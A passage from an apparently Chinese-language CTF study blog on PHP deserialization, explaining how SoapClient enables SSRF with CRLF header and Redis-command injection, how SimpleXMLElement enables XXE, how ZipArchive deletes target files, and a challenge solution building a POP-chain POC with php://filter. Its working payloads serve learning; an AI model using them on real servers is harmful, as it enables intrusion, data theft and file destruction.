class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题我想到能不能同用hex编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>虽然最后也是String字符，但是我实验下没有成功。</p>
<p>我也想到一个payload,然后1来传参，但是也没成功</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">&quot;?&gt;&quot;</span>&lt;<span class="string">?=</span><span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];<span class="string">?&gt;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="soapclient类来进行ssrf"><a class="markdownIt-Anchor" href="#soapclient类来进行ssrf"></a> SoapClient类来进行SSRF</h4>
<h5 id="soapclient类"><a class="markdownIt-Anchor" href="#soapclient类"></a> SoapClient类</h5>
<p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123; </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而<code>__call</code>触发很简单，就是当对象访问不存在的方法的时候就会触发。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br><span class="line">- 第一个参数是用来指明是否是wsdl模式，将该值设为<span class="literal">null</span>则表示非wsdl模式。</span><br><span class="line">- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间</span><br></pre></td></tr></table></figure>
<p>直接利用SoapClient来进行SSRF</p>
<p>构造php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>记得监听自己VPN上的端口<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16-16672739578745.png" alt="请添加图片描述"></p>
<p>但是当存在CRLF漏洞，我们就可以通过<code>user_agent</code>的参数伪造http头</p>
<p>运行后，监听界面就出现了伪造的http头</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/f470fdddc476471d85f438538e078165-16672739578746.png" alt="请添加图片描述"><br>
这儿可以看看怎么利用伪造http头去构造redis命令</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/0bd047f6a1934f67ba766f9caead2a7e-16672739578747.png" alt="在这里插入图片描述"><br>
伪造了redis命令，这样我们就可以用http协议去打redis了。</p>
<p>对于发送POST数据包，Content-Type 的值我们要设置为 application/x-www-form-urlencoded，而且Content-Length的值需要与post的数据长度一致。而且http头跟post数据中间间隔<code>\r\n\r\n</code>,其他间隔<code>\r\n</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功发送post数据包<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16-16672739578748.png" alt="在这里插入图片描述"></p>
<p><strong>bestphp’s revenge</strong></p>
<p>也可以看看<a href="https://blog.csdn.net/unexpectedthing/article/details/121319348">ctfshow的web259</a></p>
<p>看看<a href="https://blog.csdn.net/rfrder/article/details/114445325">feng师傅的wp</a></p>
<h4 id="使用-simplexmlelement-类进行-xxe"><a class="markdownIt-Anchor" href="#使用-simplexmlelement-类进行-xxe"></a> 使用 SimpleXMLElement 类进行 XXE</h4>
<h5 id="simplexmlelement类"><a class="markdownIt-Anchor" href="#simplexmlelement类"></a> SimpleXMLElement类</h5>
<p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下:</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9c463254527f22878a51271db820c6a4-16672739578749.png" alt="image-20210118131857853"></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/87f41bb0c1b7c7ff829dcbf4e1bdd035-166727395787410.png" alt="image-20210118131957770"></p>
<p>意味着，当我们将第三个参数<code>data_is_url</code>设置为true的话，我们就可以调用远程xml文件，实现xxe的攻击。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<h5 id="suctf2018-homework"><a class="markdownIt-Anchor" href="#suctf2018-homework"></a> SUCTF2018-Homework</h5>
<p>可以看看<a href="https://johnfrod.top/ctf/suctf-2018homework/">这个的wp</a></p>
<h4 id="使用-ziparchive-类来删除文件"><a class="markdownIt-Anchor" href="#使用-ziparchive-类来删除文件"></a> 使用 ZipArchive 类来删除文件</h4>
<p>ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>条件：php 5.20</p>
<p>常见的类方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addEmptyDir</span>：添加一个新的文件目录</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFile</span>：将文件添加到指定zip压缩包中</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFromString</span>：添加新的文件同时将内容添加进去</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">close</span>：关闭ziparchive</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">extractTo</span>：将压缩包解压</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">open</span>：打开一个zip压缩包</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteIndex</span>：删除压缩包中的某一个文件，如：<span class="title function_ invoke__">deleteIndex</span>(<span class="number">0</span>)代表删除第一个文件</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteName</span>：删除压缩包中的某一个文件名称，同时也将文件删除</span><br></pre></td></tr></table></figure>
<p>我们看看<code>ZipArchive::open</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span>=<span class="number">0</span>)</span><br><span class="line">该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</span><br><span class="line"></span><br><span class="line">filename：要打开的ZIP存档的文件名。</span><br><span class="line">flags：用于打开档案的模式。有以下几种模式：</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>：如果不存在则创建一个zip压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">RDONLY</span>：只读模式打开压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">EXCL</span>：如果压缩包已经存在，则出错。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CHECKCONS</span>：对压缩包执行额外的一致性检查，如果失败则显示错误。</span><br><span class="line">注意，如果设置flags参数的值为 <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span> 的话，可以把指定文件删除。这里我们跟进方法可以看到<span class="keyword">const</span> <span class="variable constant_">OVERWRITE</span> = <span class="number">8</span>，也就是将OVERWRITE定义为了常量<span class="number">8</span>，我们在调用时也可以直接将flags赋值为<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>也就是说我们可以通过ZipArchive直接调用open方法删除目标机上的文件</p>
<h5 id="梦里花开牡丹亭"><a class="markdownIt-Anchor" href="#梦里花开牡丹亭"></a> 梦里花开牡丹亭</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这串代码就是一个简单的反序列化POC</p>
<p>首先我们需要利用<code>file_get_contents</code>来得到文件内容</p>
<p>我们先让<code>register</code>的值为admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，进入login类后，我们需要让<code>username</code>=admin,<code>password</code>=admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，一如既往的，我们让<code>file</code>的值为<code>open</code>，那么我们就可以调用open类的open方法，达到我们的目的。</p>
<p>构造poc(其他师傅的)</p>
<p>因为前面包含<code>shell.php</code>，首先读取shell.php的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span 